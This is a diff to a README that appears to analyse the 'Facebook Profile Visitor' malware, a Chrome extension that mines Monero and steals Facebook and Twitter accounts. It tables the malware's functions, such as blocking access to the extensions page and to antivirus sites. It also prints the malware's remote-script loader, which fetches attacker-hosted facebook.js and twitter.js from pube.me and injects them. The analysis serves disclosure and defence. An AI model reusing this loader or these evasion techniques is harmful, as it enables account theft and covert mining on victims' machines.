@@ -1,6 +1,6 @@
 # How Facebook Profile Visitor virus works?
 ## What is it?
-<i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook since 03/2020 until now.
+<i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook (and Twitter) since 03/2020 until now.
 
 ## What does it do?
 It mines coin (particularly Monero) using the tool Xmrig on your computer and stoles your Facebook account to spread the virus.
@@ -1305,9 +1305,43 @@ if (chrome) {
   }
 }
 ```
-<br> That's the code that steal Facebook and Twitter accounts!
-### 8) How they steal your account?
+<br> You can see there is a `if (chrome)` statement at the end of the file and it loads other functions in this script.
+|Function|It does|
+|--------|-------|
+|`run()`|Check if the URL of each tabs start with `chrome:` protocol (Chrome internal sites) or not. If it starts with `chrome:`, that means the user is trying to access the Chrome setting (especially the Extension page) and this script will block it. If not then allow the page to load|
+|`icon()`|Set the display icon of the extension to `http://pube.me/settings.png` (it's a "setting" icon) and set the URL to open when user click on the extension icon to `chrome://settings/`|
+|`counter()`|Load Google Analytics (to log some data?)|
+|`router()`|This is originally commented (not me), perhaps the function isn't used anymore. The URL `http://pube.me/ajax/route.php` return 404|
+|`installed()`|Check for `installed` cookie to know whether this is the first time running this extension or not|
+|`loadData()`|Load the scripts to stole Facebook and Twitter accounts to spread itself (talk about this later)|
+|`onRequest()` and `getfilters()`|Block access to some websites, especially some antivirus sites.|
 
+<br> See `filters.php` in this repo for a dump of the list of websites they block.
+<br> See `facebook.js` in this repo for a dump of the Facebook hack script
+<br> See `twitter.js` in this repo for a dump of the Twitter hack script
+<br> These script are dumped so that you can see how it works, but <b>NOT</b> to reuse it by any manners!
+### 8) How they steal your account?
+<br> You can see in the end of the remote Javascript file there is:
+```javascript
+loadData(uri("/js/facebook.js?" + Date.now()));
+loadData(uri("/js/twitter.js?" + Date.now()));
+```
+<br> With `loadData` defined as:
+```javascript
+var loadData = function (url, callback) {
+  fetch(url).then(response => response.blob()).then((data) => {
+    var url = URL.createObjectURL(data);
+    var tg = document.getElementsByTagName('script')[0];
+    var js = document.createElement('script');
+    js.src = url;
+    tg.parentNode.insertBefore(js, tg);
+    if (callback) {
+      callback();
+    }
+  });
+}
+```
+<br> Using the same technique, let's get the source code of `facebook.js` and `twitter.js`. Because they are too long (`facebook.js` has 1000+ lines), so please view it at `facebook.js` and `twitter.js` in this repo.
 ### 9) The miner
 In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
 ```autoit
